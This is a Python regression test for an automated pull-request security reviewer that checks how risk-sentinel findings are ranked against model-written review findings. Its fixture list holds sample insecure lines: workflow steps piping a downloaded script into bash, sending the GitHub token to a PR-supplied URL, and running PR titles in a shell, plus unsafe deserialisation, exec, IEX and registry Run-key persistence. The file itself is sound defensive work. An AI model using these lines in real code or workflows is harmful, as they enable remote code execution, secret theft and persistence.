#!/usr/bin/env python3
"""Regression checks for stable ordinary-finding / sentinel selection."""

from __future__ import annotations

import importlib
from types import SimpleNamespace

import dcoir_review_required_runtime_patch_v4 as v4
import dcoir_review_required_runtime_patch_v5 as v5
import dcoir_review_required_runtime_patch_v9 as v9
import dcoir_review_required_runtime_patch_v10 as v10
import dcoir_review_required_runtime_patch_v11 as v11
import dcoir_review_required_runtime_patch_v13 as v13
import dcoir_review_required_runtime_patch_v16 as v16

from dcoir_review.entrypoint import DcoirReviewEntrypoint


PATH = ".github/dcoir_review/evaluation/live_verifier_probe.py"


WORKFLOW = ".github/workflows/dcoir-review-selection-probe.yml"
PYTHON = ".github/chatgpt_staging/dcoir_review_probe/selection_probe.py"
POWERSHELL = ".github/chatgpt_staging/dcoir_review_probe/selection_probe.ps1"
TYPESCRIPT = ".github/chatgpt_staging/dcoir_review_probe/selection_optional_pressure.ts"
K8S = ".github/chatgpt_staging/dcoir_review_probe/selection_bonus_k8s.yml"


def _s(path: str, line: int, kind: str, text: str) -> SimpleNamespace:
    title, body, _notes = v16._template_for_kind(kind)
    return SimpleNamespace(path=path, line=line, label=title, detail=body, text=text)


def pressure_sentinels() -> list[SimpleNamespace]:
    return [
        _s(WORKFLOW, 3, v4.YAML_PULL_REQUEST_TARGET, "  pull_request_target:"),
        _s(WORKFLOW, 5, v4.YAML_BROAD_WRITE, "  contents: write"),
        _s(WORKFLOW, 13, v4.YAML_UNTRUSTED_CHECKOUT, "          ref: ${{ github.head_ref }}"),
        _s(WORKFLOW, 16, v4.YAML_METADATA_SHELL, '          bash -lc "${{ github.event.pull_request.title }}"'),
        _s(WORKFLOW, 19, v10.YAML_TOKEN_TO_PR_URL, '          wget --header="Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" -O- "${{ github.event.pull_request.body }}"'),
        _s(WORKFLOW, 22, v4.YAML_SHELL_PIPE, "          wget -qO- https://downloads.example.invalid/bootstrap.sh | bash"),
        _s(WORKFLOW, 25, v4.YAML_METADATA_SHELL, '          sh -c "${{ github.event.pull_request.labels[0].name }}"'),
        _s(PYTHON, 12, v9.PYTHON_PICKLE_LOAD, "    return pickle.load(handle)"),
        _s(PYTHON, 16, v5.PYTHON_YAML_LOAD, "    return yaml.load(profile_text, Loader=yaml.UnsafeLoader)"),
        _s(PYTHON, 20, v16.PYTHON_DYNAMIC_EXEC, "    exec(filter_source)"),
        _s(PYTHON, 24, v5.PYTHON_SHELL_EXEC, "    return os.system(command)"),
        _s(PYTHON, 28, v11.PYTHON_ARCHIVE_EXTRACT, "        archive.extractall(destination)"),
        _s(PYTHON, 33, v5.PYTHON_ENV_TOKEN, '    return requests.post(callback_url, headers={"Authorization": f"Bearer {os.environ[\'DCOIR_TOKEN\']}"})'),
        _s(PYTHON, 37, v11.PYTHON_PATH_WRITE, "    Path(upload_name).write_bytes(data)"),
        _s(POWERSHELL, 9, v13.PS_PLAINTEXT_SECURE_STRING, "$probeValue = ConvertTo-SecureString $SecretText -AsPlainText -Force"),
        _s(POWERSHELL, 11, v4.PS_ACL, '$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")'),
        _s(POWERSHELL, 13, v4.PS_ACL, "Set-Acl -Path $TargetPath -AclObject $acl"),
        _s(POWERSHELL, 14, v4.PS_PROCESS_LAUNCH, "Start-Process -FilePath $Executable -ArgumentList $Args -Wait"),
        _s(POWERSHELL, 15, v9.PS_DYNAMIC_EXEC, "IEX $Command"),
        _s(POWERSHELL, 16, v5.PS_ENV_TOKEN, 'Invoke-RestMethod -Uri $Callback -Headers @{ Authorization = "Bearer $env:DCOIR_TOKEN" }'),
        _s(POWERSHELL, 17, v13.PS_RUN_KEY_PERSISTENCE, 'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name Probe -Value $Executable -Force'),
        _s(TYPESCRIPT, 2, v13.TS_INNER_HTML, "  target.innerHTML = input.html;"),
        _s(TYPESCRIPT, 3, v13.TS_DYNAMIC_EXECUTION, "  const runner = new Function(input.code);"),
        _s(K8S, 7, v13.K8S_HOST_PATH, "hostPath:"),
    ]


def _coverage(selected: list[dict]) -> set[v16.SentinelKey]:
    covered: set[v16.SentinelKey] = set()
    for item in selected:
        covered.update(v16._coverage_from_finding(item))
    return covered


def patched_review():
    review = importlib.import_module("openrouter_pr_review_pareto_context")
    DcoirReviewEntrypoint().apply_runtime_patches(review)
    return review


def test_no_sentinel_selection_is_identity(review) -> None:
    config = review.load_pareto_context_config(".github/dcoir_review/openrouter-pr-review-pareto.yml")
    finding = {
        "title": "Upper-bound comparison is inverted",
        "severity": "high",
        "confidence": 1.0,
        "path": PATH,
        "line": 12,
        "body": "The expression requires age_minutes >= 60 where the local contract requires an inclusive upper bound of 60.",
        "suggested_replacement": "",
    }
    selected = review.hardened.add_risk_sentinel_fallback_findings([finding], [], config, [])
    assert len(selected) == 1, selected
    assert selected[0] == finding, selected
    assert selected[0]["line"] == 12
    assert selected[0]["title"] == "Upper-bound comparison is inverted"


def test_no_sentinel_selection_preserves_multiple_model_sites(review) -> None:
    config = review.load_pareto_context_config(".github/dcoir_review/openrouter-pr-review-pareto.yml")
    findings = [
        {
            "title": "First ordinary finding",
            "severity": "medium",
            "confidence": 0.95,
            "path": "probe.py",
            "line": 4,
            "body": "First exact changed-line issue.",
        },
        {
            "title": "Second ordinary finding",
            "severity": "medium",
            "confidence": 0.94,
            "path": "probe.py",
            "line": 9,
            "body": "Second exact changed-line issue.",
        },
    ]
    selected = review.hardened.add_risk_sentinel_fallback_findings(findings, [], config, [])
    assert [(item["path"], item["line"]) for item in selected] == [("probe.py", 4), ("probe.py", 9)]
    assert [item["title"] for item in selected] == ["First ordinary finding", "Second ordinary finding"]


def test_real_sentinel_priority_preserves_unrelated_model_finding(review) -> None:
    config = review.load_pareto_context_config(".github/dcoir_review/openrouter-pr-review-pareto.yml")
    sentinel_type = review.hardened.RiskSentinel
    sentinel = sentinel_type(
        path=".github/workflows/probe.yml",
        line=7,
        label="Workflow executes pull request metadata in a shell",
        detail="probe",
        text='run: echo "${{ github.event.pull_request.title }}" | bash',
    )
    findings = [
        {
            "title": "Ordinary unrelated model issue",
            "severity": "medium",
            "confidence": 0.90,
            "path": "probe.py",
            "line": 4,
            "body": "ordinary exact changed-line issue",
        },
        {
            "title": "Ordinary prose at sentinel site",
            "severity": "medium",
            "confidence": 0.91,
            "path": ".github/workflows/probe.yml",
            "line": 7,
            "body": "mentions shell but is not deterministic provenance",
        },
    ]
    selected = review.hardened.add_risk_sentinel_fallback_findings(findings, [sentinel], config, [])
    assert len(selected) == 2, selected
    deterministic, ordinary = selected
    assert deterministic["path"] == ".github/workflows/probe.yml", deterministic
    assert deterministic["line"] == 7, deterministic
    assert deterministic.get("_risk_sentinel_key") == [
        ".github/workflows/probe.yml",
        7,
        "yaml_metadata_shell",
    ], deterministic
    assert ordinary == findings[0], selected
    assert all(item.get("title") != "Ordinary prose at sentinel site" for item in selected), selected



def test_optional_pressure_appends_only_after_required_coverage(review) -> None:
    config = SimpleNamespace(max_inline_comments=12)
    sentinels = pressure_sentinels()
    selected = review.hardened.add_risk_sentinel_fallback_findings([], sentinels, config, [])
    keys = [v16._postable_key(item) for item in selected]
    required = {
        v16._coverage_key(v16._sentinel_key(item))
        for item in sentinels
        if v16._sentinel_key(item)[2] in v16.CORE_REQUIRED_KINDS
    }
    assert required <= _coverage(selected)
    assert len(keys) == len(set(keys))
    assert any(key[0] == TYPESCRIPT and key[2] in v16.OPTIONAL_PRESSURE_KINDS for key in keys)
    assert all(not key[2].startswith("k8s_") for key in keys)
    metadata = dict(v16.core.SELECTION_SUMMARY)
    assert metadata["overflow_required_count"] == 0
    assert metadata["required_partial_overflow"] is False
    assert metadata["coverage_ledger_readback"]["required_omitted"] == 0
    assert metadata["required_ledger_schema"] == "stable_required_vs_optional_pressure_v1"


def test_optional_pressure_never_displaces_full_required_budget(review) -> None:
    sentinels = pressure_sentinels()
    base_selected, _metadata = v16._select_once(
        SimpleNamespace(), [], sentinels, SimpleNamespace(max_inline_comments=12)
    )
    no_spare_limit = len(base_selected)
    selected = review.hardened.add_risk_sentinel_fallback_findings(
        [], sentinels, SimpleNamespace(max_inline_comments=no_spare_limit), []
    )
    keys = [v16._postable_key(item) for item in selected]
    assert len(selected) == no_spare_limit
    assert not any(key[0] == TYPESCRIPT for key in keys)
    metadata = dict(v16.core.SELECTION_SUMMARY)
    assert metadata["unused_inline_slots"] == 0
    assert metadata["overflow_required_count"] == 0
    assert metadata["required_partial_overflow"] is False


def test_stable_owner_composition() -> None:
    entrypoint = DcoirReviewEntrypoint()
    names = (
        *entrypoint.patch_module_names,
        *entrypoint.terminal_patch_module_names,
        *entrypoint.post_terminal_patch_module_names,
        *entrypoint.candidate_integrity_patch_module_names,
        *entrypoint.stage_local_patch_module_names,
        *entrypoint.execution_policy_patch_module_names,
        *entrypoint.telemetry_patch_module_names,
        *entrypoint.post_telemetry_patch_module_names,
    )
    assert 'dcoir_review.sentinel_selection' in names, names
    assert 'dcoir_review_required_runtime_patch_v26' not in names, names
    assert 'dcoir_review_required_runtime_patch_v17' not in names, names


def main() -> None:
    test_stable_owner_composition()
    review = patched_review()
    test_no_sentinel_selection_is_identity(review)
    test_no_sentinel_selection_preserves_multiple_model_sites(review)
    test_real_sentinel_priority_preserves_unrelated_model_finding(review)
    test_optional_pressure_appends_only_after_required_coverage(review)
    test_optional_pressure_never_displaces_full_required_budget(review)
    print("dcoir_review_sentinel_selection_selftest passed")


if __name__ == "__main__":
    main()
